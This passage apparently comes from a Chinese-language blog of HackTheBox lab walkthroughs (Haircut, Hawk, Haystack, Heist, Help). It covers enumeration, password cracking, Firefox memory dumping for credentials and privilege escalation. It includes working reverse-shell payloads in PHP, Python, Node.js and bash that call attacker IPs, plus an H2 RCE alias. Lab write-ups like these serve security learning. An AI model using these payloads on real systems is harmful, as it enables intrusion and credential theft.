<p>并没有做过多的绕过尝试，因为竟然是curl命令 ，考虑o参数写入文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.16.98&#x2F;test.php -o a.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haircut/4.png" alt="4"></p>
<p>得到permission denied，不过还枚举出了<code>uploads</code>目录，尝试写入改目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.16.98&#x2F;test.php -o .&#x2F;uploads&#x2F;a.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haircut/9.png" alt="9"></p>
<p>成功，这样就能轻易获得shell了</p>
<p><img src="/images/Haircut/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Haircut/11.png" alt="11"></p>
<p>screen 4.5.0提权，参考<code>靶场Wintermute</code></p>
<p>编译报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc: error trying to exec &#39;cc1&#39;: execvp: No such file or directory</span><br></pre></td></tr></table></figure>

<p>尝试解决，但失败了，所以只能在本地编译传输过去，不过这两个程序都很简单，应该问题不大</p>
<p><img src="/images/Haircut/12.png" alt="12"></p>
<p>o参数的bypass和screen提权都遇到过，10分钟就完成了:)</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Hawk</title>
    <url>/2020/06/28/HTB-Hawk/</url>
    <content><![CDATA[<h1 id="Hawk"><a href="#Hawk" class="headerlink" title="Hawk"></a>Hawk</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Hawk/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>8082端口无法远程访问</p>
<p><img src="/images/Hawk/18.jpg" alt="18"></p>
<p>nmap发现21允许匿名登录，看看有什么</p>
<p><img src="/images/Hawk/2.jpg" alt="2"></p>
<p>发现了隐藏文件</p>
<p><img src="/images/Hawk/4.jpg" alt="4"></p>
<p>不过该文件进行了openssl加盐加密，显示为base64编码后的内容</p>
<p>先运行解码</p>
<p><img src="/images/Hawk/5.jpg" alt="5"></p>
<p>解码后发现，<code>Salted__kY</code>称为唯一可识别字符串</p>
<h4 id="openssl破解思路"><a href="#openssl破解思路" class="headerlink" title="openssl破解思路"></a>openssl破解思路</h4><p>这个方法来自官方writeup</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc -c drupal_decode.txt.enc</span><br></pre></td></tr></table></figure>

<p>发现它的大小为176字节，如果它能被8整除，说明很有可能是分组密码</p>
<p>我们创建8字节-176字节的明文，步长为8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in $(seq 0 8 173); do python -c &quot;print &#39;A&#39;*$i&quot; &gt; $i ;done</span><br></pre></td></tr></table></figure>

<p>创建一个文件保存准备使用的加密算法<code>cipher.lst</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-aes-256-cbc</span><br><span class="line">-aes-128-cbc</span><br><span class="line">-aes-256-ecb</span><br><span class="line">-aes-128-cbc</span><br><span class="line">-aes-256-ofb</span><br><span class="line">-aes-128-ofb</span><br><span class="line">-rc4</span><br><span class="line">-rc4-cbc</span><br><span class="line">-aria-128-cbc</span><br><span class="line">-des</span><br></pre></td></tr></table></figure>

<p>之后使用bash脚本，把每个明文从8到176全部加密</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">for cipher in $(cat cipher.lst); do</span><br><span class="line">        for length in $(ls | grep &quot;^[0-9]\?[0-9]\?[0-9]\?$&quot;); do</span><br><span class="line">echo            openssl enc $cipher -e -in $length -out $length$cipher.enc -k PleaseSubscribe</span><br><span class="line">        done</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/6.jpg" alt="6"></p>
<p>之后过滤大小也为176字节的密文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls *.enc |xargs wc -c|grep &#39;176 &#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/7.jpg" alt="7"></p>
<p>这些加密算法有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aes-128-cbc</span><br><span class="line">aes-256-cbc</span><br><span class="line">aes-256-ecb</span><br><span class="line">aria-128-cbc</span><br><span class="line">des</span><br></pre></td></tr></table></figure>

<p>在这其中，aes-256-cbc是最为常用的加密算法</p>
<p>使用<code>bruteforce-salted-openssl</code>进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bruteforce-salted-openssl -f &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt drupal_decode.txt.enc -c aes-256-cbc -d sha256</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/8.jpg" alt="8"></p>
<p>最后解出口令为friends</p>
<p>最后还原即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl aes-256-cbc -d -in drupal_decode.txt.enc -out plain.txt -k friends</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/9.jpg" alt="9"></p>
<p>得到了账户和密码</p>
<p>看了看别的方法，好像这个也能解密，<a href="https://github.com/HrushikeshK/openssl-bruteforce">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python brute.py &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt ciphers.txt drupal.txt.enc 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用账号密码进行登录，但账户并不是上述提到的Daniel<br>尝试<code>admin/PencilKeyboardScanner123</code>成功登录</p>
<p>接下里就是常规操作</p>
<p><img src="/images/Hawk/10.jpg" alt="10"></p>
<p>插入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.100 4444 &gt;&#x2F;tmp&#x2F;f&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/11.jpg" alt="11"></p>
<p>点下save的一瞬间，getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以寻找drupal的数据库配置文件，获取敏感信息</p>
<p><img src="/images/Hawk/12.jpg" alt="12"></p>
<p>提权脚本没找到，应该是存放目录错了</p>
<p>切到web目录里寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name settings.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/13.jpg" alt="13"></p>
<p>找到了</p>
<p><img src="/images/Hawk/14.jpg" alt="14"></p>
<p>发现了mysql连接文件</p>
<p><img src="/images/Hawk/15.jpg" alt="15"></p>
<p>连接成功</p>
<p><img src="/images/Hawk/16.jpg" alt="16"></p>
<p>在drupal库的users表里发现了admin的密码hash</p>
<p>hashcat支持Drupal7的hash加密(-m 7900)，不过破解不出</p>
<p>这里有坑，mysql的连接密码<code>drupal4hawk</code>是用户<code>daniel</code>的ssh密码，是一个密码复用的问题…</p>
<p><img src="/images/Hawk/17.jpg" alt="17"></p>
<p>登录进去是一个python会话，直接逃出去</p>
<p>想到之前的8082端口还没用</p>
<p><img src="/images/Hawk/19.jpg" alt="19"></p>
<p>应该是只允许本地访问</p>
<p><img src="/images/Hawk/20.jpg" alt="20"></p>
<p>而且在以root的身份运行</p>
<h3 id="方法1端口转发"><a href="#方法1端口转发" class="headerlink" title="方法1端口转发"></a>方法1端口转发</h3><p>利用端口转发，来进行访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -NL 7777:127.0.0.1:8082 daniel@10.10.10.102</span><br><span class="line">drupal4hawk</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/21.jpg" alt="21"></p>
<p>利用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;</span><br><span class="line">CALL SHELLEXEC(&#39;id&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/22.jpg" alt="22"></p>
<p>RCE成功</p>
<p>我们利用之前的低权限用户在tmp目录写一个反弹shell的py脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.16.100&#39;,5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; &gt; evil.py</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/23.jpg" alt="23"></p>
<p>调用RCE执行，成功获取root</p>
<h3 id="方法2searchsploit"><a href="#方法2searchsploit" class="headerlink" title="方法2searchsploit"></a>方法2searchsploit</h3><p><img src="/images/Hawk/24.jpg" alt="24"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 45506.py -H 127.0.0.1:8082</span><br></pre></td></tr></table></figure>

<p><img src="/images/Hawk/25.jpg" alt="25"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Haystack</title>
    <url>/2021/05/16/HTB-Haystack/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Haystack/1.png" alt="1"></p>
<p>80端口首页没有内容，目录枚举没有任何发现</p>
<p>9200端口很有意思，这是Elasticsearch的默认端口</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>访问9200端口，返回了json页面</p>
<p><img src="/images/Haystack/2.png" alt="2"></p>
<p><code>You Know, for Search</code>是一个提示，说明ES会受到未授权访问，我们可以枚举它的索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;_cat&#x2F;indices</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/3.png" alt="3"></p>
<p>发现了两个索引，quotes和bank。这里数据较多，可以使用<code>jq</code>来检索json</p>
<p>以<code>quotes</code>索引为例，首先枚举它的<code>documents</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;quotes&#x2F;_search?size&#x3D;1&#39; |jq .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/4.png" alt="4"></p>
<p><code>quote</code>里有西班牙语的留言看上去比较有意思，单独提取它</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;quotes&#x2F;_search?size&#x3D;1&#39; |jq &#39;.hits.hits[]._source.quote&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/5.png" alt="5"></p>
<p>之后提取全部253条，保存到文件里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s &#39;http:&#x2F;&#x2F;10.10.10.115:9200&#x2F;quotes&#x2F;_search?size&#x3D;253&#39; |jq &#39;.hits.hits[]._source.quote&#39; | tee &#x2F;root&#x2F;Desktop&#x2F;quote.txt</span><br></pre></td></tr></table></figure>

<p>这个文本量太大，我是用<code>grep</code>配合一些常见的西班牙语单词进行寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Contraseña		密码</span><br><span class="line">Clave			密钥</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/6.png" alt="6"></p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cGFzczogc3BhbmlzaC5pcy5rZXk&#x3D;</span><br><span class="line">dXNlcjogc2VjdXJpdHkg</span><br></pre></td></tr></table></figure>

<p>分别进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; echo -n cGFzczogc3BhbmlzaC5pcy5rZXk&#x3D; |base64 -d</span><br><span class="line">pass: spanish.is.key</span><br><span class="line">&gt; echo -n dXNlcjogc2VjdXJpdHkg |base64 -d</span><br><span class="line">user: security</span><br></pre></td></tr></table></figure>

<p>使用凭据<code>security/spanish.is.key</code>进行ssh，获得shell</p>
<p><img src="/images/Haystack/7.png" alt="7"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="kibana"><a href="#kibana" class="headerlink" title="kibana"></a>kibana</h2><p>机器运行着ELK架构，不过logstash运行在了root权限</p>
<p><img src="/images/Haystack/8.png" alt="8"></p>
<p>kibana监听在了本地端口</p>
<p><img src="/images/Haystack/9.png" alt="9"></p>
<p>通过ssh建立隧道，我们可以在以后的ssh会话中输入<code>~C</code>可以进入ssh命令行，接着进行正向隧道</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-L 9999:127.0.0.1:5601</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/10.png" alt="10"></p>
<p>访问本地的9999端口，成功进入kibana，并且得到版本6.4.2</p>
<p><img src="/images/Haystack/11.png" alt="11"></p>
<p>谷歌搜索<code>kinaba 6.4.2 exploit</code>，得到了<a href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a></p>
<p>这个漏洞可能通过预先上传node reverse shell，通过kibana包含后解析，所以正常来说需要配合上传漏洞。不过我们已经拿到了shell，所以可以在机器上写文件了。同时作者提示了，触发多次shell需要不同的文件名，这里需要注意</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net &#x3D; require(&quot;net&quot;),</span><br><span class="line">        cp &#x3D; require(&quot;child_process&quot;),</span><br><span class="line">        sh &#x3D; cp.spawn(&quot;&#x2F;bin&#x2F;sh&quot;, []);</span><br><span class="line">    var client &#x3D; new net.Socket();</span><br><span class="line">    client.connect(4444, &quot;10.10.16.12&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return &#x2F;a&#x2F;; &#x2F;&#x2F; Prevents the Node.js application form crashing</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/12.png" alt="12"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现了属于root创建，当前组可读的logstash文件</p>
<p><img src="/images/Haystack/13.png" alt="13"></p>
<p><code>input.conf</code>查找<code>/opt/kibana/logstash_</code>开头的文件，并添加执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash-4.2$ cat input.conf </span><br><span class="line">input &#123;</span><br><span class="line">        file &#123;</span><br><span class="line">                path &#x3D;&gt; &quot;&#x2F;opt&#x2F;kibana&#x2F;logstash_*&quot;</span><br><span class="line">                start_position &#x3D;&gt; &quot;beginning&quot;</span><br><span class="line">                sincedb_path &#x3D;&gt; &quot;&#x2F;dev&#x2F;null&quot;</span><br><span class="line">                stat_interval &#x3D;&gt; &quot;10 second&quot;</span><br><span class="line">                type &#x3D;&gt; &quot;execute&quot;</span><br><span class="line">                mode &#x3D;&gt; &quot;read&quot;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>filter.conf</code>读取文件的内容，进行正则匹配，提取comando语句块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">        if [type] &#x3D;&#x3D; &quot;execute&quot; &#123;</span><br><span class="line">                grok &#123;</span><br><span class="line">                        match &#x3D;&gt; &#123; &quot;message&quot; &#x3D;&gt; &quot;Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;&quot; &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>output.conf</code>执行comando部分的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">output &#123;</span><br><span class="line">        if [type] &#x3D;&#x3D; &quot;execute&quot; &#123;</span><br><span class="line">                stdout &#123; codec &#x3D;&gt; json &#125;</span><br><span class="line">                exec &#123;</span><br><span class="line">                        command &#x3D;&gt; &quot;%&#123;comando&#125; &amp;&quot;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以<code>/opt/kibana/</code>目录下创造<code>logstash_evil</code>文件，里面存放合适的正则内容，我是用<a href="https://jex.im/regulex/#!flags=&re=Ejecutar%5Cs*comando%5Cs*%3A%5Cs%2B%25%7BGREEDYDATA%3Acomando%7D">链接</a>来辅助分析，并使用<a href="http://grokdebug.herokuapp.com/">链接</a>来验证输入是否合法</p>
<p><img src="/images/Haystack/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;Ejecutar comando: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.12&#x2F;5555 0&gt;&amp;1&#39; &gt; &#x2F;opt&#x2F;kibanalogstash_shell</span><br></pre></td></tr></table></figure>

<p><img src="/images/Haystack/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Heist</title>
    <url>/2021/05/15/HTB-Heist/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Heist/1.png" alt="1"></p>
<p>登陆80端口，发现网站为IIS+PHP，首页为登陆页面</p>
<p><img src="/images/Heist/2.png" alt="2"></p>
<p>该页面提供了访客登陆，登陆后发现了Issues页面</p>
<p><img src="/images/Heist/3.png" alt="3"></p>
<p>大致的疑似说Cisco的路由器出了问题，并提供了一个附件。之后Hazard要求管理员在Widnows上创建他自己用户名的账户</p>
<p><img src="/images/Heist/4.png" alt="4"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>寻找到一个网站可以快速了解Cisco相关密码的加密形式<a href="https://learningnetwork.cisco.com/s/article/cisco-routers-password-types">链接</a></p>
<p>type5的md5值<code>$1$pdQG$o8nrSzsGXeaduXrjlvKc91</code>可以用john或hashcat来破解</p>
<p><img src="/images/Heist/5.png" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john hash --format&#x3D;md5crypt-long --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到<code>stealth1agent</code></p>
<p>type7使用了维吉尼亚密码，可以在线破解:<a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">链接</a><br>在Github上也能找到离线破解的python3脚本:<a href="https://github.com/theevilbit/ciscot7">链接</a></p>
<p><img src="/images/Heist/6.png" alt="6"></p>
<p>整理一下总共三个密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stealth1agent</span><br><span class="line">Q4)sJu\Y8qz*A3?d</span><br><span class="line">$uperP@ssword</span><br></pre></td></tr></table></figure>

<p>通过路由器的issue页面，也整理的一份用户名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rout3r</span><br><span class="line">admin</span><br><span class="line">hazard</span><br></pre></td></tr></table></figure>

<p>我们可以使用它们对WinRM进行爆破，失败了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.149 -u username -p password --continue-on-success</span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/7.png" alt="7"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb --shares 10.10.10.149 -u username -p password</span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/8.png" alt="8"></p>
<p>SMB枚举并没有有意思的分享目录，不过这说明凭据<code>hazard/stealth1agent</code>是正确的，可能是WinRM上的一些策略限制了这些</p>
<p>不过有了正确的凭据，我们可以进行RPC枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient -U hazard 10.10.10.149</span><br></pre></td></tr></table></figure>

<p>由于不是域环境，所以不能通过<code>enumdomusers</code>枚举用户，这里需要一个使用SID的技巧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames administrator</span><br><span class="line">administrator S-1-5-21-4254423774-1266059056-3197185112-500 (User: 1)</span><br></pre></td></tr></table></figure>

<p>在SID中，administrator的<code>relative identifier</code>默认是500，普通用户的通常是1000起步，前面部分通常是固定，所以利用这一点我们可以枚举用户，类似</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1000</span><br><span class="line">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1001</span><br><span class="line">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1002</span><br><span class="line">.......</span><br></pre></td></tr></table></figure>

<p>我们可以使用一个简单的for循环进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for i in &#123;1000..1050&#125;; do rpcclient -U &#39;hazard%stealth1agent&#39; 10.10.10.149 -c &quot;lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i&quot; | grep -v unknown; done</span><br></pre></td></tr></table></figure>

<p>或者使用impacket的<code>lookupsids.py</code>进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 lookupsid.py &#39;hazard:stealth1agent&#39;@10.10.10.149</span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/9.png" alt="9"></p>
<p>获取了更多用户，跟新username列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AdministratorsupportChaseJason</span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/10.png" alt="10"></p>
<p>得到用户<code>Chase</code>密码<code>Q4)sJu\Y8qz*A3?d</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -u Chase -p &#39;Q4)sJu\Y8qz*A3?d&#39; -i 10.10.10.149</span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/11.png" alt="11"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>首先去枚举web目录，因为之前没在web服务上做什么事。不过这里没有枚举目录的权限，不过可以查看知道文件名的文件</p>
<p><img src="/images/Heist/13.png" alt="13"></p>
<p>通过<code>login.php</code>发现了硬编码的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?phpsession_start();if( isset($_REQUEST[&#39;login&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_username&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_password&#39;])) &#123;        if( $_REQUEST[&#39;login_username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin@support.htb&#39; &amp;&amp; hash( &#39;sha256&#39;, $_REQUEST[&#39;login_password&#39;]) &#x3D;&#x3D;&#x3D; &#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&#39;) &#123;                $_SESSION[&#39;admin&#39;] &#x3D; &quot;valid&quot;;                header(&#39;Location: issues.php&#39;);        &#125;        else                header(&#39;Location: errorpage.php&#39;);&#125;else if( isset($_GET[&#39;guest&#39;]) ) &#123;        if( $_GET[&#39;guest&#39;] &#x3D;&#x3D;&#x3D; &#39;true&#39; ) &#123;                $_SESSION[&#39;guest&#39;] &#x3D; &quot;valid&quot;;                header(&#39;Location: issues.php&#39;);        &#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>不过哈希采用了sha256，这里没有能够破解出来</p>
<p>在桌面发现了todo.txt</p>
<p><img src="/images/Heist/12.png" alt="12"></p>
<p>发现有一个用户回去查看issues，猜测可能使用浏览器查看，枚举进程发现了firefox</p>
<p><img src="/images/Heist/14.png" alt="14"></p>
<p>使用procdump来导出内存的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma 296</span><br></pre></td></tr></table></figure>

<p>也可以使用Powershell-Empire(powersploit)里的Out-Minidump.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get-process -id 6252 | Out-Minidump</span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/15.png" alt="15"></p>
<p>下载回kali，这个过程很慢，导出内容的大小将近300MB</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">download firefox.exe_210514_121345.dmp</span><br></pre></td></tr></table></figure>

<p>下载完后用<code>strings</code>进行查看，发现密码<code>4dD!5&#125;x/re8]FBuZ</code></p>
<p><img src="/images/Heist/16.png" alt="16"></p>
<p>使用密码连接Administrator即可</p>
<p><img src="/images/Heist/17.png" alt="17"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><code>0xdf</code>的使用mimikittenz的过程很有意思，可以省去大量下载的时间，Thanks<a href="https://0xdf.gitlab.io/2019/11/30/htb-heist.html">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$matchesFound&#x3D;[mimikittenz.MemProcInspector]::InspectManyProcs(&quot;iexplore&quot;,&quot;chrome&quot;,&quot;firefox&quot;)</span><br></pre></td></tr></table></figure>

<p>它会去寻找这三个浏览器的内存数据，然后正则匹配，但它只匹配了一些主流的网站的一些特征请求，因此我们需要添加自己的正则比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mimikittenz.MemProcInspector]::AddRegex(&quot;VeryCool&quot;,&quot;login_username&#x3D;(.*)&amp;login_password&#x3D;(.*)&amp;login&#x3D;&quot;)   </span><br></pre></td></tr></table></figure>

<p><img src="/images/Heist/18.png" alt="18"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Help </title>
    <url>/2021/05/31/HTB-Help/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Help/1.png" alt="1"></p>
<p>web枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.121&#x2F; -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-medium-directories.txt -f -n</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/2.png" alt="2"></p>
<p>发现了Web应用</p>
<p><img src="/images/Help/3.png" alt="3"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h2 id="方法1-文件上换"><a href="#方法1-文件上换" class="headerlink" title="方法1 文件上换"></a>方法1 文件上换</h2><p>搜索公开漏洞发现</p>
<p><img src="/images/Help/4.png" alt="4"></p>
<p>这是开源的，在github上能找到该<a href="https://github.com/evolutionscript/HelpDeskZ-1.0">项目</a>，所以我寻找可能可以定位Web应用版本的文件</p>
<p>在这里从<code>README.md</code>处得到版本1.0.2，并且知道这是一个PHP站点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s http:&#x2F;&#x2F;10.10.10.121&#x2F;support&#x2F;README.md</span><br></pre></td></tr></table></figure>

<p><img src="/images/Help/5.png" alt="5"></p>
<p>查看<code>40300.py</code>关于文件上传的Exp的描述</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HelpDeskZ &#x3D; v1.0.2 suffers from an unauthenticated shell upload vulnerability.</span><br><span class="line"></span><br><span class="line">The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file</span><br><span class="line"></span><br><span class="line">controllers httpsgithub.comevolutionscriptHelpDeskZ-1.0tree006662bb856e126a38f2bb76df44a2e4e3d37350controllerssubmit_ticket_controller.php - Line 141</span><br><span class="line">$filename &#x3D; md5($_FILES[&#39;attachment&#39;][&#39;name&#39;].time())...$ext;</span><br><span class="line"></span><br><span class="line">So by guessing the time the file was uploaded, we can get RCE.</span><br><span class="line"></span><br><span class="line">Steps to reproduce</span><br><span class="line"></span><br><span class="line">httplocalhosthelpdeskzv&#x3D;submit_ticket&amp;action&#x3D;displayForm</span><br><span class="line"></span><br><span class="line">Enter anything in the mandatory fields, attach your phpshell.php, solve the captcha and submit your ticket.</span><br><span class="line"></span><br><span class="line">Call this script with the base url of your HelpdeskZ-Installation and the name of the file you uploaded</span><br><span class="line"></span><br><span class="line">exploit.py httplocalhosthelpdeskz phpshell.php</span><br></pre></td></tr></table></figure>

<p>关键点在于，我们可以在未经认证的请客下上传PHP文件，不过文件名备份被进行了一些处理</p>
